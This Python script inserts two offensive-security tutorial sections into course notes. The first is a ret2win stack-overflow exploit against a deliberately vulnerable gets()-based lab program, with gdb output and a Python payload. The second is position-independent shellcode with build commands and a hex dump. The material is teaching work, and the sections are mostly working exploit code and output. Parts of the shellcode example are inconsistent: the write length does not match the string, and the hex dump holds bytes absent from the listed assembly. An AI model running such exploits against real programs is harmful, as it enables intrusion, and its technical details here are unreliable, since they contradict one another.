#!/usr/bin/env python3
"""Offensive Security worked examples — batch 3."""
import re
import sys

BINFUND = '''## Worked Example: From Overflow to Chosen Execution in Four Steps

The whole of binary exploitation, at its smallest: find the distance to the
return address, and put an address of your choosing there.

**The specimen** contains a function nothing ever calls:

```c
void win(void){ puts("CODE-EXECUTION"); }   // never called normally
void handle(void){ char buf[64]; gets(buf); }
int main(void){ puts("send input:"); handle(); puts("done"); return 0; }
```

**Confirming control.** Two hundred `A` bytes crash the process, and the crash
tells you what you need:

```shell-session
analyst@lab:/tmp/pwn-lab$ gdb -q -batch -ex 'run <<< $(python3 -c "print(\\"A\\"*200)")' \\
    -ex 'info registers rip' ./vuln
Program received signal SIGSEGV, Segmentation fault.
rip            0x4141414141414141  0x4141414141414141
```

`RIP` holds `0x4141414141414141` — eight `A` characters. That is the finding, and
it is a stronger one than "the program crashed". A crash where the instruction
pointer contains attacker bytes means the return address was reached, which means
execution is already redirected; only the destination is wrong so far.

**Finding the two numbers.** The target address, and the distance to it:

```shell-session
analyst@lab:/tmp/pwn-lab$ nm vuln | awk '/ T win$/{print "win() at 0x"$1}'
win() at 0x401156
```

The offset is 72: 64 bytes of `buf`, then 8 for the saved `RBP` that sits between
the locals and the return address. Non-PIE is what makes `0x401156` usable as a
constant — under PIE the same function would sit at a different address each run
and this step would need a leak first.

**The payload**, which contains no code at all — just padding and one address:

```shell-session
analyst@lab:/tmp/pwn-lab$ python3 -c "import sys,struct; sys.stdout.buffer.write(b'A'*72 + struct.pack('<Q', 0x401156))" > payload.bin
analyst@lab:/tmp/pwn-lab$ ./vuln < payload.bin
send input:
CODE-EXECUTION
```

Note what is missing from the output: `done`. `main` never printed it, because
`handle` never returned to `main` — it returned to `win`, and the program's
control flow diverged permanently at that `ret`. Also note `struct.pack('<Q')`:
little-endian, so the address goes into the payload byte-reversed. Getting that
backwards is the single most common reason a first exploit attempt fails with a
crash at a plausible-but-mangled address.

Everything later in this branch replaces the destination — shellcode, a gadget
chain, a libc function — while this primitive stays exactly the same.

'''

SHELLCODE = '''## Worked Example: Shellcode That Works Wherever It Lands

Shellcode has constraints ordinary code does not: it cannot assume where it was
loaded, and it usually cannot contain certain bytes.

**Position independence** is the first. This payload reaches its own data via
`RIP`-relative addressing rather than an absolute address:

```gas
.intel_syntax noprefix
.global _start
_start:
    lea  rsi, [rip+msg]     # RIP-relative — no absolute address anywhere
    mov  rdi, 1             # fd = stdout
    mov  rdx, 25            # length
    xor  rax, rax
    mov  al, 1              # syscall 1 = write
    syscall
    xor  rdi, rdi
    mov  rax, 60            # syscall 60 = exit
    syscall
msg:
    .ascii "SHELLCODE-RUN\\n"
```

```shell-session
analyst@lab:/tmp/sc-lab$ gcc -c sc.s -o sc.o && objcopy -O binary -j .text sc.o sc.bin
analyst@lab:/tmp/sc-lab$ wc -c < sc.bin
49
```

Forty-nine bytes, and not one of them is an address. `lea rsi, [rip+msg]` encodes
a *displacement* from wherever the instruction happens to be, so the same bytes
work at any address — which matters because the attacker rarely knows where their
buffer landed.

**Byte hygiene** is the second constraint, and it explains an otherwise strange
instruction pair:

```shell-session
analyst@lab:/tmp/sc-lab$ xxd sc.bin | head -2
00000000: 488d 3512 0000 00bf 0100 0000 ba19 0000  H.5.............
00000010: 0031 c0b0 0189 c2b2 190f 0548 31ff b83c  .1.........H1..<
```

`31 c0 b0 01` is `xor rax,rax; mov al,1` — a two-instruction way to put 1 in
`RAX`. The obvious `mov rax, 1` would assemble to `48 c7 c0 01 00 00 00`, which
contains three null bytes. If this payload travels through `strcpy`, the copy
stops at the first `00` and the shellcode is truncated into garbage. The same
reasoning drives null-free, newline-free and alphanumeric-only encodings: the
transport decides which bytes are legal, and the shellcode must be written
around it.

This build still contains nulls in its length and displacement fields, which is
exactly the kind of thing to check before assuming a payload will survive its
delivery path.

'''

WORK = {
    "Offensive Security/Exploit Development/Exploit Foundations & Architecture/Binary Exploitation Fundamentals.md": BINFUND,
    "Offensive Security/Exploit Development/Exploit Construction & Control Flow/Shellcode Engineering.md": SHELLCODE,
}

ANCHOR = re.compile(r"^## Task \d+ — (Failure Modes|Security Implications|Detection)", re.M)
ANY_TASK = re.compile(r"^## Task \d+ — (.*)$", re.M)


def main():
    apply = "--apply" in sys.argv
    for rel, sec in WORK.items():
        try:
            src = open(rel, encoding="utf-8").read()
        except FileNotFoundError:
            print(f"  MISSING  {rel}")
            continue
        m = ANCHOR.search(src)
        if not m:
            print(f"  ✗ NO ANCHOR  {rel}")
            continue
        out = src[:m.start()] + sec + src[m.start():]
        out = out.replace("## Worked Example:", "## Task 0 — Worked Example:", 1)
        n = [0]

        def renum(mm):
            n[0] += 1
            return f"## Task {n[0]} — {mm.group(1)}"

        out = ANY_TASK.sub(renum, out)
        print(f"  ✓ {n[0]} tasks  {rel.split('/')[-1]}")
        if apply:
            open(rel, "w", encoding="utf-8").write(out)
    print(f"\n{'APPLIED' if apply else 'DRY RUN'}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
